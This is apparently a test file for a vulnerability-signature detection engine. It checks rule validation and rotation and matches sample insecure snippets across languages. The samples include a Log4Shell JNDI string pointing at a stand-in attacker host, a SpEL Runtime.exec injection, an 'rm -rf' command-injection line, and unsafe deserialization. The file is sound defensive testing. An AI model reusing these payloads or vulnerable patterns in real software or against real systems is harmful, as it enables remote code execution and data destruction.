/**
 * Tests for the expanded signature registry (#527, #668).
 *
 * Covers:
 *   1. Stateless compilation and validation of dynamic signatures.
 *   2. Atomic rotation and batch updates preventing database corruption.
 *   3. Multi-language security signatures: Python, JS/TS, Java, Go, PHP, Ruby, Rust/C++, Docker/IaC.
 *   4. Framework-specific exploit signatures: Django, Flask, Express, Next.js, Spring, Laravel, Rails.
 *   5. Filtering and search capabilities by language, framework, category, and severity.
 *   6. Dynamic fingerprinting risk calculation and zero-day exploit identification.
 */
import { describe, it, expect, beforeEach } from "vitest";
import {
  DynamicFingerprintEngine,
  SignatureValidationError,
  compileSignaturePattern,
  validateSignature,
  type PayloadSignature,
} from "./fingerprint";
import {
  EXPANDED_SIGNATURE_REGISTRY,
  getSignaturesByLanguage,
  getSignaturesByFramework,
  getSignaturesByCategory,
  getSignaturesBySeverity,
  searchSignatures,
  loadRegistryIntoEngine,
  exportSignatureCatalogSummary,
  type ExtendedPayloadSignature,
} from "./signature-registry";

const sig = (over: Partial<PayloadSignature> = {}): PayloadSignature => ({
  id: "SIG-TEST-001",
  name: "Test Signature",
  pattern: /test_payload_vector/,
  severity: "HIGH",
  category: "ZERO_DAY_EXPLOIT",
  version: "1.0.0",
  ...over,
});

describe("compileSignaturePattern", () => {
  it("strips the global flag so test() is stateless", () => {
    const compiled = compileSignaturePattern(/ghp_[a-z0-9]{4}/g);

    expect(compiled.flags).not.toContain("g");
    expect(compiled.test("ghp_abcd")).toBe(true);
    expect(compiled.test("ghp_abcd")).toBe(true);
    expect(compiled.test("ghp_abcd")).toBe(true);
  });

  it("strips the sticky flag too", () => {
    const compiled = compileSignaturePattern(/abc/y);

    expect(compiled.flags).not.toContain("y");
    expect(compiled.test("xxabc")).toBe(true);
    expect(compiled.test("xxabc")).toBe(true);
  });

  it("keeps meaningful flags and always matches case-insensitively", () => {
    const compiled = compileSignaturePattern(new RegExp("^eval", "ms"));

    expect(compiled.flags).toContain("m");
    expect(compiled.flags).toContain("s");
    expect(compiled.flags).toContain("i");
  });

  it("drops the global flag but keeps the rest", () => {
    const compiled = compileSignaturePattern(new RegExp("^eval", "gmi"));

    expect(compiled.flags).not.toContain("g");
    expect(compiled.flags).toContain("m");
    expect(compiled.flags).toContain("i");
  });

  it("compiles string patterns case-insensitively", () => {
    const compiled = compileSignaturePattern("union\\s+select");

    expect(compiled.test("UNION  SELECT")).toBe(true);
  });
});

describe("validateSignature", () => {
  it("accepts a well-formed signature", () => {
    expect(validateSignature(sig(), "s")).toEqual([]);
  });

  it("reports a missing id", () => {
    expect(validateSignature(sig({ id: "" }), "s")).toContain("s: missing a non-empty string id");
  });

  it("reports a whitespace-only id", () => {
    expect(validateSignature(sig({ id: "   " }), "s")).toHaveLength(1);
  });

  it("reports a missing pattern", () => {
    expect(validateSignature(sig({ pattern: "" }), "s")).toContain("s: missing a pattern");
  });

  it("reports an unparseable string pattern", () => {
    const issues = validateSignature(sig({ pattern: "([unclosed" }), "s");
    expect(issues).toHaveLength(1);
    expect(issues[0]).toContain("not a valid regular expression");
  });

  it("reports an unknown severity and category together", () => {
    const issues = validateSignature(
      sig({
        severity: "SEVERE" as PayloadSignature["severity"],
        category: "MAGIC" as PayloadSignature["category"],
      }),
      "s",
    );
    expect(issues).toHaveLength(2);
  });
});

describe("DynamicFingerprintEngine rotation atomicity", () => {
  let engine: DynamicFingerprintEngine;

  beforeEach(() => {
    engine = new DynamicFingerprintEngine();
  });

  it("starts from the four built-in signatures", () => {
    expect(engine.getSignatures()).toHaveLength(4);
    expect(engine.getActiveVersion()).toBe("1.0.0");
  });

  it("keeps the existing database intact when a rotation batch is invalid", () => {
    const before = engine.getSignatures();

    expect(() =>
      engine.rotateSignatures([sig({ id: "SIG-OK" }), sig({ id: "", name: "broken" })], "2.0.0"),
    ).toThrow(SignatureValidationError);

    expect(engine.getSignatures()).toEqual(before);
    expect(engine.getActiveVersion()).toBe("1.0.0");
  });

  it("still detects built-in payloads after a rejected rotation", () => {
    try {
      engine.rotateSignatures([sig({ pattern: "([unclosed" })], "2.0.0");
    } catch {
      /* expected */
    }

    const res = engine.analyzePayload("repo", "src/a.ts", "RCE", "eval(atob('x'))");

    expect(res.matchedSignatures.length).toBeGreaterThan(0);
    expect(res.isZeroDayDetected).toBe(true);
  });

  it("reports every problem in the batch, not just the first", () => {
    let caught: SignatureValidationError | undefined;

    try {
      engine.rotateSignatures([
        sig({ id: "" }),
        sig({ id: "SIG-B", pattern: "([unclosed" }),
        sig({ id: "SIG-C", severity: "SEVERE" as PayloadSignature["severity"] }),
      ]);
    } catch (err) {
      caught = err as SignatureValidationError;
    }

    expect(caught).toBeInstanceOf(SignatureValidationError);
    expect(caught?.issues).toHaveLength(3);
  });

  it("rejects duplicate ids inside one batch", () => {
    expect(() => engine.rotateSignatures([sig({ id: "DUP" }), sig({ id: "DUP" })])).toThrow(
      /duplicate id/,
    );
  });

  it("refuses to rotate to an empty database", () => {
    expect(() => engine.rotateSignatures([])).toThrow(/disable detection entirely/);
    expect(engine.getSignatures()).toHaveLength(4);
  });

  it("rejects a non-array batch", () => {
    expect(() => engine.rotateSignatures(null as unknown as PayloadSignature[])).toThrow(
      SignatureValidationError,
    );
    expect(engine.getSignatures()).toHaveLength(4);
  });

  it("applies a valid rotation and bumps the version when none is given", () => {
    engine.rotateSignatures([sig({ id: "SIG-NEW" })]);

    expect(engine.getSignatures()).toHaveLength(1);
    expect(engine.getActiveVersion()).toBe("2.0.0");
  });
});

describe("DynamicFingerprintEngine batch updates", () => {
  let engine: DynamicFingerprintEngine;

  beforeEach(() => {
    engine = new DynamicFingerprintEngine();
  });

  it("does not partially apply an invalid update batch", () => {
    expect(() =>
      engine.updateSignatureDatabase([sig({ id: "SIG-GOOD" }), sig({ id: "" })], "1.5.0"),
    ).toThrow(SignatureValidationError);

    expect(engine.getSignatures().some((s) => s.id === "SIG-GOOD")).toBe(false);
    expect(engine.getSignatures()).toHaveLength(4);
    expect(engine.getActiveVersion()).toBe("1.0.0");
  });

  it("applies a fully valid update batch on top of the defaults", () => {
    engine.updateSignatureDatabase([sig({ id: "SIG-GOOD" })], "1.5.0");

    expect(engine.getSignatures()).toHaveLength(5);
    expect(engine.getActiveVersion()).toBe("1.5.0");
  });

  it("leaves the database untouched when registerSignature rejects", () => {
    expect(() => engine.registerSignature(sig({ pattern: "([unclosed" }))).toThrow(
      SignatureValidationError,
    );
    expect(engine.getSignatures()).toHaveLength(4);
  });
});

describe("DynamicFingerprintEngine stateless matching", () => {
  let engine: DynamicFingerprintEngine;

  beforeEach(() => {
    engine = new DynamicFingerprintEngine();
  });

  it("matches a global-flagged signature consistently across snippets", () => {
    engine.registerSignature(
      sig({ id: "SIG-GLOBAL", pattern: /ghp_[a-z0-9]{4}/g, severity: "CRITICAL" }),
    );

    const results = [0, 1, 2, 3].map(
      () =>
        engine.analyzePayload("repo", "src/a.ts", "Secret", "token = ghp_abcd").matchedSignatures,
    );

    for (const matched of results) {
      expect(matched.some((s) => s.id === "SIG-GLOBAL")).toBe(true);
    }
  });

  it("produces a stable risk score for identical payloads", () => {
    engine.registerSignature(sig({ id: "SIG-GLOBAL", pattern: /secret_value/g }));

    const first = engine.analyzePayload("repo", "src/a.ts", "Secret", "secret_value").riskScore;
    const second = engine.analyzePayload("repo", "src/a.ts", "Secret", "secret_value").riskScore;

    expect(second).toBe(first);
  });

  it("does not expose the internal compiled pattern", () => {
    const [first] = engine.getSignatures();
    expect(first).not.toHaveProperty("compiled");
  });

  it("keeps matchedSignatures free of the internal compiled pattern", () => {
    const res = engine.analyzePayload("repo", "src/a.ts", "RCE", "eval(atob('x'))");
    expect(res.matchedSignatures[0]).not.toHaveProperty("compiled");
  });

  it("caps the risk score at 100", () => {
    const res = engine.analyzePayload(
      "repo",
      "src/a.ts",
      "Mixed",
      "eval(atob('x')); __proto__['a']= ; UNION SELECT; ghp_" + "a".repeat(36),
    );
    expect(res.riskScore).toBeLessThanOrEqual(100);
  });
});

describe("Expanded Signature Registry Catalog and Multi-Language Detection", () => {
  let engine: DynamicFingerprintEngine;

  beforeEach(() => {
    engine = new DynamicFingerprintEngine();
    loadRegistryIntoEngine(engine);
  });

  it("validates that all curated signatures are valid and compile cleanly", () => {
    expect(EXPANDED_SIGNATURE_REGISTRY.length).toBeGreaterThanOrEqual(20);

    for (const signature of EXPANDED_SIGNATURE_REGISTRY) {
      const issues = validateSignature(signature, signature.id);
      expect(issues).toEqual([]);
      expect(signature.cweIds?.length).toBeGreaterThan(0);
      expect(signature.owaspCategories?.length).toBeGreaterThan(0);
      expect(signature.remediationGuidance).toBeDefined();
    }
  });

  it("filters signatures by programming language", () => {
    const pySignatures = getSignaturesByLanguage("python");
    expect(pySignatures.length).toBeGreaterThanOrEqual(4);
    expect(pySignatures.every((s) => s.targetLanguages?.includes("python"))).toBe(true);

    const jsSignatures = getSignaturesByLanguage("javascript");
    expect(jsSignatures.length).toBeGreaterThanOrEqual(4);

    const javaSignatures = getSignaturesByLanguage("java");
    expect(javaSignatures.length).toBeGreaterThanOrEqual(3);

    const goSignatures = getSignaturesByLanguage("go");
    expect(goSignatures.length).toBeGreaterThanOrEqual(2);

    const phpSignatures = getSignaturesByLanguage("php");
    expect(phpSignatures.length).toBeGreaterThanOrEqual(3);

    const rbSignatures = getSignaturesByLanguage("ruby");
    expect(rbSignatures.length).toBeGreaterThanOrEqual(2);

    const rustSignatures = getSignaturesByLanguage("rust");
    expect(rustSignatures.length).toBeGreaterThanOrEqual(1);

    const dockerSignatures = getSignaturesByLanguage("dockerfile");
    expect(dockerSignatures.length).toBeGreaterThanOrEqual(1);
  });

  it("filters signatures by web framework", () => {
    const djangoSigs = getSignaturesByFramework("django");
    expect(djangoSigs.length).toBeGreaterThanOrEqual(3);

    const springSigs = getSignaturesByFramework("spring");
    expect(springSigs.length).toBeGreaterThanOrEqual(3);

    const expressSigs = getSignaturesByFramework("express");
    expect(expressSigs.length).toBeGreaterThanOrEqual(3);

    const laravelSigs = getSignaturesByFramework("laravel");
    expect(laravelSigs.length).toBeGreaterThanOrEqual(2);

    const railsSigs = getSignaturesByFramework("rails");
    expect(railsSigs.length).toBeGreaterThanOrEqual(2);
  });

  it("filters signatures by category and severity", () => {
    const rceSigs = getSignaturesByCategory("RCE");
    expect(rceSigs.length).toBeGreaterThanOrEqual(5);

    const critSigs = getSignaturesBySeverity("CRITICAL");
    expect(critSigs.length).toBeGreaterThanOrEqual(8);
  });

  it("searches signatures by keyword across metadata and description", () => {
    const pickleResults = searchSignatures("pickle");
    expect(pickleResults.length).toBeGreaterThanOrEqual(1);
    expect(pickleResults[0].id).toBe("SIG-PY-001");

    const log4jResults = searchSignatures("log4shell");
    expect(log4jResults.length).toBeGreaterThanOrEqual(1);
    expect(log4jResults[0].id).toBe("SIG-JAVA-001");

    const cwe78Results = searchSignatures("CWE-78");
    expect(cwe78Results.length).toBeGreaterThanOrEqual(2);
  });

  it("exports an accurate catalog summary", () => {
    const summary = exportSignatureCatalogSummary();
    expect(summary.totalSignatures).toBe(EXPANDED_SIGNATURE_REGISTRY.length);
    expect(summary.languages).toContain("python");
    expect(summary.languages).toContain("javascript");
    expect(summary.languages).toContain("java");
    expect(summary.languages).toContain("go");
    expect(summary.frameworks).toContain("spring");
    expect(summary.frameworks).toContain("django");
    expect(summary.version).toBe("1.1.0");
  });

  it("detects Python insecure deserialization and command injection", () => {
    const pickleRes = engine.analyzePayload(
      "repo",
      "handlers/worker.py",
      "InsecureDeserialization",
      "import pickle\ndata = pickle.loads(raw_user_input)",
    );
    expect(pickleRes.matchedSignatures.some((s) => s.id === "SIG-PY-001")).toBe(true);
    expect(pickleRes.isZeroDayDetected).toBe(true);

    const osSystemRes = engine.analyzePayload(
      "repo",
      "scripts/deploy.py",
      "CommandInjection",
      "import subprocess\nsubprocess.Popen(f'ping {host}', shell=True)",
    );
    expect(osSystemRes.matchedSignatures.some((s) => s.id === "SIG-PY-002")).toBe(true);
  });

  it("detects Python Jinja2 SSTI and Django raw SQL interpolation", () => {
    const sstiRes = engine.analyzePayload(
      "repo",
      "views.py",
      "SSTI",
      "return render_template_string(f'Hello {name}')",
    );
    expect(sstiRes.matchedSignatures.some((s) => s.id === "SIG-PY-003")).toBe(true);

    const djangoSqlRes = engine.analyzePayload(
      "repo",
      "models.py",
      "SQLi",
      "User.objects.raw(f'SELECT * FROM users WHERE id = {user_id}')",
    );
    expect(djangoSqlRes.matchedSignatures.some((s) => s.id === "SIG-PY-004")).toBe(true);
  });

  it("detects Node.js dynamic child_process, VM injection, and JWT none algorithm", () => {
    const childProcRes = engine.analyzePayload(
      "repo",
      "server.ts",
      "RCE",
      "child_process.exec(`rm -rf ${userPath}`);",
    );
    expect(childProcRes.matchedSignatures.some((s) => s.id === "SIG-JS-001")).toBe(true);

    const vmRes = engine.analyzePayload(
      "repo",
      "sandbox.js",
      "VM_Escape",
      "vm.runInNewContext(userCode, sandbox);",
    );
    expect(vmRes.matchedSignatures.some((s) => s.id === "SIG-JS-002")).toBe(true);

    const jwtNoneRes = engine.analyzePayload(
      "repo",
      "auth.ts",
      "AuthBypass",
      "const decoded = jwt.verify(token, null, { algorithms: ['none'] });",
    );
    expect(jwtNoneRes.matchedSignatures.some((s) => s.id === "SIG-JS-004")).toBe(true);
  });

  it("detects React dangerouslySetInnerHTML and SSRF fetch patterns", () => {
    const xssRes = engine.analyzePayload(
      "repo",
      "Component.tsx",
      "XSS",
      "<div dangerouslySetInnerHTML={{ __html: `<b>${userBio}</b>` }} />",
    );
    expect(xssRes.matchedSignatures.some((s) => s.id === "SIG-JS-003")).toBe(true);

    const ssrfRes = engine.analyzePayload(
      "repo",
      "proxy.ts",
      "SSRF",
      "const resp = await fetch(req.query.targetUrl);",
    );
    expect(ssrfRes.matchedSignatures.some((s) => s.id === "SIG-JS-005")).toBe(true);
  });

  it("detects Java Log4Shell and Spring Expression Language (SpEL) injection", () => {
    const log4jRes = engine.analyzePayload(
      "repo",
      "App.java",
      "Log4Shell",
      "logger.info('User: ' + '${jndi:ldap://attacker.com/payload}');",
    );
    expect(log4jRes.matchedSignatures.some((s) => s.id === "SIG-JAVA-001")).toBe(true);

    const spelRes = engine.analyzePayload(
      "repo",
      "SpelService.java",
      "RCE",
      "String exp = 'T(java.lang.Runtime).getRuntime().exec(\"id\")';",
    );
    expect(spelRes.matchedSignatures.some((s) => s.id === "SIG-JAVA-002")).toBe(true);
  });

  it("detects Go exec.Command shell invocation and InsecureSkipVerify", () => {
    const goExecRes = engine.analyzePayload(
      "repo",
      "main.go",
      "RCE",
      "cmd := exec.Command(\"sh\", \"-c\", fmt.Sprintf(\"cat %s\", filePath))",
    );
    expect(goExecRes.matchedSignatures.some((s) => s.id === "SIG-GO-001")).toBe(true);

    const goTlsRes = engine.analyzePayload(
      "repo",
      "client.go",
      "TLS",
      "tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}",
    );
    expect(goTlsRes.matchedSignatures.some((s) => s.id === "SIG-GO-002")).toBe(true);
  });

  it("detects PHP unsafe unserialize and Laravel raw query builder injection", () => {
    const phpUnserializeRes = engine.analyzePayload(
      "repo",
      "session.php",
      "InsecureDeserialization",
      "$data = unserialize($_POST['session_token']);",
    );
    expect(phpUnserializeRes.matchedSignatures.some((s) => s.id === "SIG-PHP-001")).toBe(true);

    const laravelSqlRes = engine.analyzePayload(
      "repo",
      "UserController.php",
      "SQLi",
      "DB::raw('SELECT * FROM users WHERE status = ' . $status);",
    );
    expect(laravelSqlRes.matchedSignatures.some((s) => s.id === "SIG-PHP-003")).toBe(true);
  });

  it("detects Ruby unsafe YAML deserialization and Rails permit! bypass", () => {
    const yamlRes = engine.analyzePayload(
      "repo",
      "config_loader.rb",
      "RCE",
      "obj = YAML.load(File.read(path))",
    );
    expect(yamlRes.matchedSignatures.some((s) => s.id === "SIG-RB-001")).toBe(true);

    const permitRes = engine.analyzePayload(
      "repo",
      "users_controller.rb",
      "MassAssignment",
      "user.update(params.permit!)",
    );
    expect(permitRes.matchedSignatures.some((s) => s.id === "SIG-RB-002")).toBe(true);
  });

  it("detects native C strcpy and Rust mem::transmute usage", () => {
    const strcpyRes = engine.analyzePayload(
      "repo",
      "buffer.c",
      "BufferOverflow",
      "strcpy(destBuffer, userSource);",
    );
    expect(strcpyRes.matchedSignatures.some((s) => s.id === "SIG-NATIVE-001")).toBe(true);

    const rustTransmuteRes = engine.analyzePayload(
      "repo",
      "mem.rs",
      "UnsafePointer",
      "let val: &Target = std::mem::transmute(source_ptr);",
    );
    expect(rustTransmuteRes.matchedSignatures.some((s) => s.id === "SIG-RUST-001")).toBe(true);
  });

  it("detects Dockerfile and Kubernetes infrastructure vulnerabilities", () => {
    const dockerRes = engine.analyzePayload(
      "repo",
      "Dockerfile",
      "SecretLeak",
      "ENV AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE",
    );
    expect(dockerRes.matchedSignatures.some((s) => s.id === "SIG-IAC-001")).toBe(true);

    const k8sRes = engine.analyzePayload(
      "repo",
      "cluster-rbac.yaml",
      "RBAC",
      "kind: ClusterRoleBinding\nroleRef:\n  name: cluster-admin",
    );
    expect(k8sRes.matchedSignatures.some((s) => s.id === "SIG-IAC-002")).toBe(true);
  });

  it("supports selective registry loading into engine by language and category", () => {
    const customEngine = new DynamicFingerprintEngine();
    const count = loadRegistryIntoEngine(customEngine, {
      languages: ["python"],
      categories: ["RCE"],
      version: "2.0.0",
    });

    expect(count).toBeGreaterThanOrEqual(2);
    expect(customEngine.getActiveVersion()).toBe("2.0.0");
    const activeSignatures = customEngine.getSignatures();
    expect(activeSignatures.some((s) => s.id === "SIG-PY-001")).toBe(true);
  });
});
